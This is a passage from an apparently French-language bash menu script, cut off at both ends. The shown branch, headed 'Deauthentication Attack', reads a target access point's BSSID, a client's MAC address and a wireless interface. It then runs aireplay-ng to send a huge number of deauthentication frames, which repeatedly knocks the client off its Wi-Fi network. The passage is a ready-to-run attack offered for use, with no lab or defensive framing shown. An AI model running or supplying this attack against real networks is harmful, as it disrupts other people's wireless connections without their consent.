wireshark
fi






if [ $choix = "da" ]
then
clear
echo -------------------------
echo  Deauthentication Attack
echo  - need monitor monde -
echo -------------------------
echo ap bssid
read -p  'bssid : ' bssidda
echo
echo mac address client
echo
read -p 'mac add :' macda
echo
echo interface
echo
read -p ' interface : ' interfaceda

clear
echo -e  '\e[1;32m '
echo attack started ... 
xterm -e aireplay-ng -0 122222 -a $bssidda -c $macda $interfaceda
